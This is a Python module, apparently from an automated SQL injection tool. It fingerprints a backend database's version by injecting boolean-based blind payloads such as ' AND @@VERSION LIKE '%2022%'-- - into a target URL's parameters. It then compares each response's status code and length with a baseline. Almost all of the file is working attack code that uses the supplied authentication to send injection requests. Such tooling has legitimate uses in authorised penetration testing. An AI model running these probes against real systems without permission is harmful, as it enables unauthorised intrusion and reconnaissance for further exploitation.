import httpx

from .models import DBMSType, Parameter, ProbeLog, NmapDBInfo
from .payloads import VERSION_PROBES
from .prober import send_probe, _build_headers, _build_cookies, _inject_param


# Nmap mssql.lua VERSION_LOOKUP_TABLE 기반
# SERVERPROPERTY('ProductMajorVersion') 반환값 → 제품 연도
MSSQL_VERSION_MAP: dict[str, str] = {
    "8":  "2000",
    "9":  "2005",
    "10": "2008",
    "11": "2012",
    "12": "2014",
    "13": "2016",
    "14": "2017",
    "15": "2019",
    "16": "2022",
}

# MSSQL: @@VERSION LIKE 기반 버전 프로브 (Nmap VERSION_LOOKUP_TABLE 순서 반영)
# 문자열형: ' AND @@VERSION LIKE '%2022%'-- -
# 정수형:     AND @@VERSION LIKE '%2022%'-- -  (파라미터 값이 숫자일 때)
def _mssql_version_probes(integer_based: bool) -> list[tuple[str, str]]:
    prefix = " " if integer_based else "' "
    return [
        (v, f"{prefix}AND @@VERSION LIKE '%{v}%'-- -")
        for _, v in sorted(MSSQL_VERSION_MAP.items(), key=lambda x: int(x[0]), reverse=True)
    ]


async def _fetch_baseline(
    client: httpx.AsyncClient,
    url: str,
    param: Parameter,
    auth: dict[str, str],
    method: str,
) -> tuple[int, int]:
    """원본 파라미터 값으로 요청해 baseline 상태코드와 응답 길이를 확보한다."""
    baseline_url, body = _inject_param(url, param, "")  # 페이로드 없이 원본 값만
    headers = _build_headers(param, "", auth)
    cookies = _build_cookies(auth)
    try:
        if method == "POST":
            resp = await client.post(baseline_url, data=body or {param.name: param.value},
                                     headers=headers, cookies=cookies)
        else:
            resp = await client.get(baseline_url, headers=headers, cookies=cookies)
        return resp.status_code, len(resp.content)
    except httpx.RequestError:
        return 0, 0


async def extract_version(
    dbms: DBMSType,
    url: str,
    params: list[Parameter],
    auth: dict[str, str],
    nmap_data: NmapDBInfo | None = None,
    method: str = "GET",
) -> tuple[str | None, list[ProbeLog]]:
    """
    DBMS 버전을 추출한다.
    Nmap이 버전 문자열을 이미 제공한 경우 요청 없이 바로 반환한다.
    없으면 Boolean 페이로드로 메이저 버전을 탐색한다.
    """
    logs: list[ProbeLog] = []

    # Nmap에 버전 정보가 있으면 바로 반환
    if nmap_data and nmap_data.version:
        return nmap_data.version, []

    # 파라미터 값이 숫자면 정수형 주입으로 판단
    integer_based = params[0].value.strip().lstrip("-").isdigit()

    # DBMS별 프로브 선택
    if dbms == DBMSType.MSSQL:
        probes = _mssql_version_probes(integer_based)
    else:
        probes = VERSION_PROBES.get(dbms, [])

    if not probes or not params:
        return None, []

    # 주입 가능한 파라미터 중 첫 번째만 사용 (버전 추출은 단일 파라미터로 충분)
    param = params[0]

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
        baseline_status, baseline_length = await _fetch_baseline(
            client, url, param, auth, method
        )

        for label, payload in probes:
            log = await send_probe(client, url, param, payload, auth, method)
            logs.append(log)

            if log.response_status == 0:
                continue

            length_diff = abs(log.response_length - baseline_length)
            status_match = log.response_status == baseline_status

            # 정상 응답과 같은 패턴이면 해당 버전 조건이 참
            if status_match and length_diff <= 50:
                return label, logs

    return None, logs
